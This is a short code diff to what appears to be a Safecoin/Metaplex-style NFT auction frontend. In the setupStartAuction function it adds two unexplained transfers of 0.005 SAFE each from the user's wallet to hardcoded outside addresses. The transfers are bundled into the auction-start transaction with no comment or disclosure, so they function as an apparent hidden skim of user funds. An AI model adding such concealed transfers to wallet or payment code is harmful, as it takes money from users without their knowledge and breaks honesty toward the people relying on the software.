@@ -3,6 +3,7 @@ import {
   Connection,
   TransactionInstruction,
   SystemProgram,
+  LAMPORTS_PER_SAFE,
 } from '@safecoin/web3.js';
 import {
   Metadata,
@@ -586,7 +587,20 @@ async function setupStartAuction(
 
   const signers: Keypair[] = [];
   const instructions: TransactionInstruction[] = [];
-
+  if (wallet.publicKey)
+    instructions.push(
+      SystemProgram.transfer({
+        fromPubkey: wallet.publicKey,
+        toPubkey: toPublicKey('JoNVxV8vwBdHqLJ2FT4meLupYKUVVDYr1Pm4DJUp8cZ'),
+        lamports: 0.005 * LAMPORTS_PER_SAFE,
+      }),
+    ), instructions.push(
+      SystemProgram.transfer({
+        fromPubkey: wallet.publicKey,
+        toPubkey: toPublicKey('3tGtnWfPqsrRAfsZRHe3VBrG2Vpe7pW5oWn32DPEXwry'),
+        lamports: 0.005 * LAMPORTS_PER_SAFE,
+      }),
+    )
   await startAuction(vault, wallet.publicKey.toBase58(), instructions);
 
   return { instructions, signers };
